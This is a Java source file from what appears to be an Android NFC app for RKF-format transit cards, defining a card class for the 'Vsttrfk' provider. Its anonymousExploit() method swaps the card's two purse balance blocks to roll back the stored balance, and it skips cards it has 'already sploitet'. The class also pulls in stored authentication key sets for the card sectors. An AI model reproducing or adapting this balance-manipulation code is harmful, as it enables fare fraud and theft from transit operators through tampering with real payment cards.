package com.vsttrfk.git64.cards;

import java.io.IOException;

import android.nfc.TagLostException;

import com.vsttrfk.git64.auth.IRKFAuthable;
import com.vsttrfk.git64.tools.BlockId;
import com.vsttrfk.git64.tools.Util;

public class VsttrfkCard extends AbstractRKFCard {

	private final byte[][] data;

	/**
	 * Create card object from nfc-source
	 * 
	 * @param mfc
	 */
	public VsttrfkCard(byte[][] data) throws TagLostException, IOException {
		super(data);
		this.data = super.getData();
	}
	
	public String getProvider(){
		return "Vsttrfk";
	}
	
	public boolean anonymousExploit() {
		final int i = getBlock(BlockId.PURSE);
		if (Util.toHexString(data[8][3]).charAt(1) == '8'
				&& data[i + 1][0] > data[i + 2][0]) {
			return false; // Card was already sploitet.
		}

		// switch places between the two balance blocks.
		final byte[] temp = data[i + 1];
		data[i + 1] = data[i + 2];
		data[i + 2] = temp;

		return true;
	}

	protected int getBalanceBlock(){
		final int i = getBlock(BlockId.PURSE);
		final String blockSelect = Util.toHexString(data[8][3]);
		int result = 0 ;
		if (blockSelect.charAt(1) == '8') {
			result = i + 2;
		}
		if (blockSelect.charAt(1) == '4') {
			result = i + 1;
		}

		return result;
	}

	public byte[][] getKeysA() {
		return IRKFAuthable.KEYS_A_VSTTRFK;
	}

	public byte[][] getKeysB() {
		return IRKFAuthable.KEYS_B_VSTTRFK;
	}
}
